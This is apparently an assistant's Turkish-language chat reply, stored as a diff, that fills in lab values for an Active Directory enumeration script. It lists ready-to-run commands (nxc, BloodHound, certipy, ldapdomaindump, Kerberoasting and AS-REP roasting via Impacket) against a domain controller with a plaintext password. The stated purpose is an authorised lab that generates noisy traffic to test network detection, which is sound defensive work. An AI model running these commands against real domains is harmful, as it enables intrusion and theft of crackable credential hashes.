@@ -1,0 +1,81 @@
+Tamam. Domain adıyla birlikte değerlerin şöyle olacak:
+
+```bash
+DC_IP="192.168.39.143"
+DOMAIN="ndrpoc.local"
+BASE_DN="DC=ndrpoc,DC=local"
+USER="turing"
+PASS='Password3#'
+SUBNET="192.168.39.0/24"
+```
+
+Önceki script’te şu satırı:
+
+```bash
+DOMAIN="${DOMAIN:-}"
+```
+
+şununla değiştir:
+
+```bash
+DOMAIN="${DOMAIN:-ndrpoc.local}"
+```
+
+İstersen script’i değiştirmeden direkt böyle de çalıştırabilirsin:
+
+```bash
+DOMAIN='ndrpoc.local' ./noisy_ad_enum.sh
+```
+
+Manuel tek komut testleri için hazır format:
+
+```bash
+nxc smb 192.168.39.0/24 -u turing -p 'Password3#' -d ndrpoc.local
+nxc smb 192.168.39.0/24 -u turing -p 'Password3#' -d ndrpoc.local --shares
+nxc smb 192.168.39.0/24 -u turing -p 'Password3#' -d ndrpoc.local --sessions
+nxc smb 192.168.39.143 -u turing -p 'Password3#' -d ndrpoc.local --rid-brute 4000
+
+nxc ldap 192.168.39.143 -u turing -p 'Password3#' -d ndrpoc.local --users
+nxc ldap 192.168.39.143 -u turing -p 'Password3#' -d ndrpoc.local --groups
+nxc ldap 192.168.39.143 -u turing -p 'Password3#' -d ndrpoc.local --find-delegation
+
+ldapdomaindump ldap://192.168.39.143 \
+  -u 'ndrpoc.local\turing' \
+  -p 'Password3#' \
+  -o ldapdomaindump-ndrpoc
+
+bloodhound-python \
+  -u turing \
+  -p 'Password3#' \
+  -d ndrpoc.local \
+  -ns 192.168.39.143 \
+  -dc 192.168.39.143 \
+  -c All \
+  --zip \
+  -op bh-ndrpoc-all
+
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -text \
+  -json \
+  -bloodhound \
+  -output certipy-ndrpoc-full
+
+GetADUsers.py 'ndrpoc.local/turing:Password3#' -dc-ip 192.168.39.143 -all
+GetUserSPNs.py 'ndrpoc.local/turing:Password3#' -dc-ip 192.168.39.143 -request
+GetNPUsers.py 'ndrpoc.local/turing:Password3#' -dc-ip 192.168.39.143 -request
+findDelegation.py 'ndrpoc.local/turing:Password3#' -dc-ip 192.168.39.143
+
+adidnsdump \
+  -u 'ndrpoc.local\turing' \
+  -p 'Password3#' \
+  --dns-tcp \
+  --print-zones \
+  ldap://192.168.39.143 \
+  -r \
+  -o adidnsdump-ndrpoc
+```
+
+Bu, önceki CRTP / yetkili lab rotandaki **AD enum + noisy NDR visibility** amacına uygun kalır. 
